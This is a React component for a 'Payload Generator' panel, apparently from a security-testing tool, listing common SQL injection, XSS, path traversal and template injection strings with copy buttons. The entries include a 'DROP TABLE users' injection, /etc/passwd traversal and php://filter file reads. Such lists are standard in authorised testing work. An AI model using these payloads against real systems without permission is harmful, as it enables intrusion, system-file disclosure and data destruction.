"use client"

import { useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Copy } from "lucide-react"

const payloads = {
    sqli: [
        "' OR 1=1 --",
        "' UNION SELECT 1,2,3 --",
        "admin' --",
        "' OR '1'='1",
        "1; DROP TABLE users",
    ],
    xss: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "<svg/onload=alert(1)>"
    ],
    lfi: [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "/etc/passwd%00",
    ],
    ssti: [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config.items()}}",
    ]
}

export function PayloadGenerator() {
    const [category, setCategory] = useState<keyof typeof payloads>("sqli")
    const [filter, setFilter] = useState("")

    const filteredPayloads = payloads[category].filter(p => p.toLowerCase().includes(filter.toLowerCase()))

    return (
        <Card className="h-full">
            <CardHeader>
                <CardTitle>Payload Generator</CardTitle>
                <CardDescription>Common payloads for web vulnerabilities</CardDescription>
            </CardHeader>
            <CardContent className="space-y-6">
                <div className="flex gap-4">
                    <Select value={category} onValueChange={(v) => setCategory(v as any)}>
                        <SelectTrigger className="w-[200px]">
                            <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                            <SelectItem value="sqli">SQL Injection</SelectItem>
                            <SelectItem value="xss">XSS</SelectItem>
                            <SelectItem value="lfi">LFI / Path Traversal</SelectItem>
                            <SelectItem value="ssti">SSTI</SelectItem>
                        </SelectContent>
                    </Select>
                    <Input placeholder="Filter..." value={filter} onChange={(e) => setFilter(e.target.value)} />
                </div>

                <div className="grid gap-2">
                    {filteredPayloads.map((payload, i) => (
                        <div key={i} className="flex items-center gap-2 p-2 rounded border bg-muted/50">
                            <code className="flex-1 font-mono text-sm break-all">{payload}</code>
                            <Button variant="ghost" size="icon" onClick={() => navigator.clipboard.writeText(payload)}>
                                <Copy className="h-4 w-4" />
                            </Button>
                        </div>
                    ))}
                </div>
            </CardContent>
        </Card>
    )
}
